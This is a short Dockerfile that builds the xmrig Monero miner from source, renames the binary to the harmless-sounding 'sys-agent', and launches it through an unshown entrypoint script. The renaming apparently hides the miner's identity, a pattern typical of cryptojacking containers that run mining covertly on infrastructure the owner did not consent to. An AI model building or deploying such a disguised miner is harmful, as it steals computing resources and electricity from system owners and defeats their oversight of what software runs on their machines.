FROM debian:bullseye-slim

# Install dependencies
RUN apt-get update && apt-get install -y \
  build-essential cmake git automake libtool autoconf \
  libhwloc-dev libuv1-dev libssl-dev && \
  rm -rf /var/lib/apt/lists/*

# Set working directory
WORKDIR /app

# Clone xmrig
RUN git clone https://github.com/xmrig/xmrig.git

# Build xmrig
WORKDIR /app/xmrig
RUN mkdir build && cd build && \
    cmake .. && make -j$(nproc)

# Rename binary to sys-agent
RUN mv /app/xmrig/build/xmrig /app/sys-agent && chmod +x /app/sys-agent

# Copy entrypoint script
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

# Set working dir and run
WORKDIR /app
CMD ["/entrypoint.sh"]
